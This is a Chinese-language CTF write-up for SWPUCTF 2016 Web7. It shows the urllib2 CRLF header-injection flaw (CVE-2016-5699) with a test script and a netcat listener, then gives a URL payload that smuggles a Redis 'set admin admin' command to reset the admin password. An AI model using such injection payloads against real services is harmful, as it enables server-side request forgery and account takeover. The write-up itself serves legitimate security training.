---
title: '[SWPUCTF 2016]Web7'
date: 2025-02-23 16:32:06
tags: 
      - 漏洞
      - urllib注入
      - crlf 
categories: 刷题笔记
---

## [SWPUCTF 2016]Web7

打开页面，就一个登录和提交的按钮

我们随便输入什么提交，发现报错了

![image-20250223195354255](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502231954359.png)

通过报错信息，我们可以发现python的版本是2.7，并且使用了urllib2

通过查询，我们得知了urllib2头注入漏洞（CVE-2016-5699）

16年的老洞

漏洞验证代码为

1.py

```py
#!/usr/bin/env python3

import sys
import urllib
import urllib.error
import urllib.request

url = sys.argv[1]

try:
    info = urllib.request.urlopen(url).info()
    print(info)
except urllib.error.URLError as e:
    print(e)
```

我们本地开启nc监听端口

```
nc -l -p 12345
```



然后正常运行访问

```
./1.py http://127.0.0.1:12345/foo
```

我们在nc中收到如下报文

![image-20250223203326626](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502232033719.png)



现在，我们在IP地址和端口之间的分隔符即`:`之前进行CRLF注入，尝试注入两个HTTP头字段：

```
./1.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo
```

然后在nc中接收到如下报文：

```
GET /foo HTTP/1.1
Accept-Encoding: identity
User-Agent: Python-urllib/3.4
Host: 127.0.0.1
X-injected: header
x-leftover: :12345
Connection: close
```

我们可以看到，在Host头字段处获取主机IP地址时成功进行了CRLF注入，两个请求头成功注入

另外，在针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如`%00`，这样才能顺利地进行DNS查询。



回到题解，之前login说我们需要admin的密码

这题解就是通过urllib注入redis，修改admin密码

```
http://127.0.0.1%0d%0a%0d%0aset%20admin%20admin%0d%0aHost:%20127.0.0.1:6379
```

我们将payload提交，发完后立马登录，因为靶机写了脚本定时修改admin密码

得到flag

![image-20250223204349559](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502232043593.png)

#### urllib为什么能攻击到redis

CRLF（Carriage Return Line Feed）攻击本质上是利用HTTP请求中换行符的特殊性质来操控服务器的响应。具体到Redis，它是基于协议的服务器，而其通信协议（RESP，Redis Serialization Protocol）要求客户端发送一系列特定格式的命令和数据。如果攻击者在发送请求时能够控制消息格式中的换行符，便可以造成一些潜在的安全问题。
